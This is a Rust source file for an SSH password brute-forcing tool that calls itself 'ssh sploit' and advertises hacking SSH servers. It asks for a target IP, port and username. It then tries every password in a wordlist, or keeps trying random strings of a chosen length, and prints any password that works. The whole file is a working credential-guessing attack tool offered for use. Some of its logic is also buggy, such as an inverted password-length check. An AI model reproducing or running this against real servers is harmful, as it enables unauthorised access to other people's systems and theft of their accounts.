use rand::Rng;
use std::*;
use std::io::Write;
use std::fs::File;
use std::io::{BufRead, BufReader};
use ssh2::Session;
use std::net::TcpStream;
use std::process::abort;
use std::sync::atomic::Ordering;

// SYSTEM
fn banner(){
    println!("          _                 _       _ _        ");
    println!("  ___ ___| |__    ___ _ __ | | ___ (_) |_      ");
    println!(" / __/ __| '_ \\  / __| '_ \\| |/ _ \\| | __|  ");
    println!(" \\__ \\__ \\ | | | \\__ \\ |_) | | (_) | | |_ ");
    println!(" |___/___/_| |_| |___/ .__/|_|\\___/|_|\\__|   ");
    println!("                     |_|   V:0.1               ");
    println!("[?] hack ssh server's with speed and style :^)\n\n")
}



fn clear(){
    print!("\x1B[2J\x1B[1;1H");
}

fn enter(mut line: &str){
    print!("{}", line);
    std::io::stdout().flush().unwrap();
}

fn color(mut c: &str) -> &str{
    if c == "res"{
        return "\x1b[00m";
    }
    else if c == "blue"{
        return "\x1b[34m";
    }
    else if c == "green"{
        return "\x1b[32m";
    }
    else if c == "red"{
        return "\x1b[31m";
    }
    else{
        return "\x1b[00m";
    }
}
// EXPLOIT
// CHAR EXPLOIT
fn random_gen(mut lenght: u8) -> String{
    let mut rng = rand::thread_rng();
    let mut i: u8 = 0;
    let mut data: String = "".to_string();
    while i != lenght{
        let mut n1: u8 = rng.gen_range(33..126);
        let mut ch: char = n1 as char;
        i += 1;
        data =  data + &ch.to_string();
    }

    return data;

}

// connect
static mut CHK: bool = true;

fn connect(mut user: String, mut pass: String, mut ip: String, mut port: String) -> Result<(), String>{
    // format input
    user = user.replace("\n", "");
    pass = pass.replace("\n", "");
    ip   = ip.replace("\n", "");
    port = port.replace("\n", "");
    let tcp = match TcpStream::connect(format!("{}:{}", ip, port)) {
        Ok(t) => t,
        Err(e) => return Err(e.to_string())
    };

    let mut session = Session::new().unwrap();
    session.set_tcp_stream(tcp);
    match session.handshake() {
        Err(e) => return Err(e.to_string()),
        _ => {}
    }
    return match session.userauth_password(user.as_str(), pass.as_str()) {
        Ok(_) => Ok(()),
        Err(e) => Err(e.to_string())
    }
}            
// "Connection refused (os error 111)"{


// RUN
fn main() {
    let mut null_enter = String::new();
    clear();
    banner();

    let mut op = String::new();

    println!("[1] wordlist attack");
    println!("[2] char attack");
    println!("[3] simple connect");

    enter("> ");
    

    std::io::stdin().read_line(&mut op).unwrap();
    if op == "1\n"{

        println!("\n\n");
        let mut word = String::new();
        let mut ip = String::new();
        let mut port = String::new();
        let mut user = String::new();

        enter("enter path to wordlist > ");
        
        
        std::io::stdin().read_line(&mut word).unwrap();

        enter("enter server ip > ");
        std::io::stdin().read_line(&mut ip).unwrap();

        enter("enter ssh port > ");
        std::io::stdin().read_line(&mut port).unwrap();

        enter("enter ssh user > ");
        std::io::stdin().read_line(&mut user).unwrap();

        // acc attack
        println!("[{}*{}] starting attack on {}{}:{}{}",color("blue"), color("res"), color("red"), ip.trim(), port.trim(), color("res"));
        enter("[ENTER] hit enter to start attack > ");
        std::io::stdin().read_line(&mut null_enter).unwrap();

        let file = File::open(word.trim());
        
        
        let reader = BufReader::new(file.unwrap());
        for (index, line) in reader.lines().enumerate() {
            let mut line = line.unwrap(); // Ignore errors.
            // Show the line and its number.
            let chk = connect(user.clone(), line.clone(), ip.clone(), port.clone());
            if chk.is_ok() {
                println!("[{}+{}] got password: {}", color("green"), color("res"), line);
                abort();
                
            }
            else{
                println!("[{}!{}] connection too {}:{} failled due to {} using pas {} |", color("red"), color("res"), ip.trim(), port.trim(), chk.err().unwrap(), line);
            }
            
        }
        println!("[{}!{}] password wasn't found in list or username was wrong!", color("red"), color("res"));
        
    }
    else if op == "2\n"{
        let mut ip = String::new();
        let mut port = String::new();
        let mut user = String::new();
        let mut pas_len_str = String::new();
        let mut pas_len:u8 = 0;
        let mut pas_len_good: bool = false;

        enter("enter server ip > ");
        std::io::stdin().read_line(&mut ip).unwrap();

        enter("enter ssh port > ");
        std::io::stdin().read_line(&mut port).unwrap();

        enter("enter ssh user > ");
        std::io::stdin().read_line(&mut user).unwrap();

        while pas_len_good != true{
            enter("enter password lengh (8-200) > ");
            std::io::stdin().read_line(&mut pas_len_str).unwrap();
            pas_len = pas_len_str.trim().parse().expect("[!] input must be number!");
            if pas_len > 8 && pas_len < 200{
                println!("[{}!{}] password lenght must be between 8 and 200!", color("red"), color("res"));
            }
            else{
                pas_len_good = true;
            }
        }
        println!("[{}*{}] starting attack on {}{}:{}{}, press {}CTRL+C{} to stop the attack",color("blue"), color("res"), color("red"), ip.trim(), port.trim(), color("res"), color("blue"), color("res"));
        enter("[ENTER] hit enter to start attack > ");
        std::io::stdin().read_line(&mut null_enter).unwrap();
        
        let mut attack_num: i32 = 1;

        while attack_num != 0{
            let mut pass = random_gen(pas_len);
            let chk = connect(user.clone(), pass.clone(), ip.clone(), port.clone());
            if chk.is_ok() {
                println!("[{}+{}] got password: {} after {} attempts", color("green"), color("res"), pass, attack_num);
                abort();
                
            }
            else{
                println!("[{}!{}] connection too {}:{} failled due to {} on attempt {}, press CTRL+C to exit", color("red"), color("res"), ip.trim(), port.trim(), chk.err().unwrap(), attack_num);
            }
            attack_num += 1;
            
        }
        

    }
    else if op == "3\n"{
        let mut ip = String::new();
        let mut port = String::new();
        let mut user = String::new();
        let mut pass = String::new();

        enter("enter server ip > ");
        std::io::stdin().read_line(&mut ip).unwrap();

        enter("enter ssh port > ");
        std::io::stdin().read_line(&mut port).unwrap();

        enter("enter ssh user > ");
        std::io::stdin().read_line(&mut user).unwrap();

        enter("enter ssh password > ");
        std::io::stdin().read_line(&mut pass).unwrap();

        println!("[{}*{}] starting connect on {}{}:{}{}, using {}:{}",color("blue"), color("res"), color("red"), ip.trim(), port.trim(), color("res"), user.trim(), pass.trim());
        enter("[ENTER] hit enter to start attack > ");
        std::io::stdin().read_line(&mut null_enter).unwrap();

        let chk = connect(user.clone(), pass.clone(), ip.clone(), port.clone());
        if chk.is_ok() {
            println!("[{}+{}] got password: {}", color("green"), color("res"), pass);

        }
        else{
            println!("[{}!{}] connection too {}:{} failled due to {}", color("red"), color("res"), ip.trim(), port.trim(), chk.err().unwrap());
        }
        
        
    }
    else{
        println!("[{}!{}] {} isn't an option", color("red"), color("res"), op.trim());
    }

}
